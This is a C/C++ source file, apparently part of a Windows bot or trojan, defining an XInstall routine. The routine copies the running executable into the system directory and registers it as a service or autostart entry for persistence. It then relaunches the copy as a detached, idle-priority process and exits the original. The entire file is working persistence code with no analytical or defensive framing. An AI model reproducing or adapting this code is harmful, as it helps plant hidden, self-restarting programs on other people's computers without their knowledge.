#include "includes.h"
#include "externs.h"

#ifndef DLL_MODE
bool XInstall()
{
	#ifdef DEBUG_SYSTEM
	dbg("XInstall(), Started");
	#endif

	char Path[MAX_PATH*2] = {0}, sysdir_file[MAX_PATH] = {0}, sysdir[MAX_PATH] = {0};//, cmdline[MAX_PATH*2] = {0};

	GetSystemDirectory(sysdir, sizeof(sysdir));
//	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_snprintf(sysdir_file, sizeof(sysdir_file), "%s\\%s", sysdir, Filename);


	if (strcmpi(sysdir_file, MainStruct.CurrentFilename))
	{
		for (int i = 0; i < 2/*MAXRET*/; i++)
		{

//			DWORD status;
		//	DWORD status = CopyFile(cfilename, sysdir_file, FALSE);
			if (CopyFile(MainStruct.CurrentFilename, sysdir_file, FALSE))
			{
				//printf("Copy File Failed: %d\r\n", GetLastError());
			

	//			_snprintf(cmdline, sizeof(cmdline), "\"%s\" -start", MainStruct.CurrentFilename);
				//printf("cmdline: %s\r\n", cmdline);
				if (MainStruct.IsNTBased)
				{
	//				dbg("install sc(0)");
					if (!XCreateService(NULL, XDefaultServiceName, XDefaultServiceDisplayName, sysdir_file, TRUE))
						XAddAutoStart(sysdir_file);
				}
				else
					XAddAutoStart(sysdir_file);

				//_snprintf(cmdline, sizeof(cmdline), "\"%s\" -start", MainStruct.CurrentFilename);
				//strcpy(cmdline, ServicePath);

				strncpy(Path, sysdir_file, sizeof(Path));

	//			dbg("!!!!!!!!!!!!!!!!!!1");

				goto cproc;
			}
			Sleep(1000);
			//Sleep(200);
		}
		return false;
	//	return true;
	}
	else
		return false;


cproc:

	PROCESS_INFORMATION p;
	STARTUPINFO s;
	memset(&p, 0, sizeof(p));
	memset(&s, 0, sizeof(s));
			
	s.cb = sizeof(s);
	s.lpTitle = Version;

	s.wShowWindow = XShowMode;

//			dbg("Path: %s", Path);
//			dbg("cmdline: %s", cmdline);

	
	if (CreateProcess(Path, NULL, NULL, NULL, TRUE, IDLE_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &s, &p))
	{
		ReleaseMutex(MainStruct.MainMutex);
	//	CloseHandle(MainStruct.MainMutex);
		
		Sleep(500);

		ExitProcess(0);
	}

	return true;
}
#endif